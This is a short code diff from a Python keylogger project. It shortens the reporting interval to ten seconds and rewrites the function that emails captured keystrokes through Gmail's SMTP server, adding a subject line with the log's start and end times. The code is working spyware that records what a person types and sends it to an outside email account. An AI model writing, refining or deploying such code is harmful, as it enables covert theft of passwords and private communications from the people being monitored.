@@ -16,7 +16,7 @@ from txt_based_calc import *
 
 # global parameters
 # seconds before email is sent (modify to your liking)
-REPORT_INTERVAL = 15
+REPORT_INTERVAL = 10
 EMAIL_ADDRESS = config.EMAIL_ADDRESS
 EMAIL_PW = config.EMAIL_PW
 
@@ -53,12 +53,11 @@ class Keylogger:
 
         self.log += name
     
-    def send_email(self, email, pwd, msg):
-        # TODO: change title of email to start and end date of log
-        headers = [
-            "Subject: " + "log: " + str(self.end_dt),
-            "Content-Type: text/html"
-        ]
+    def send_email(self, email, pwd, log):
+        # formatting msg object to include a subject, the start and end date of the log
+        # replacing microseconds with 0, to make dates easier to read
+        subject = "log: " + str(self.start_dt.replace(microsecond=0)) + " -> " + str(self.end_dt.replace(microsecond=0))
+        msg = 'Subject: {}\n\n{}'.format(subject, log)
         try:
             # using starttls()
             server = smtplib.SMTP(host='smtp.gmail.com', port=587)
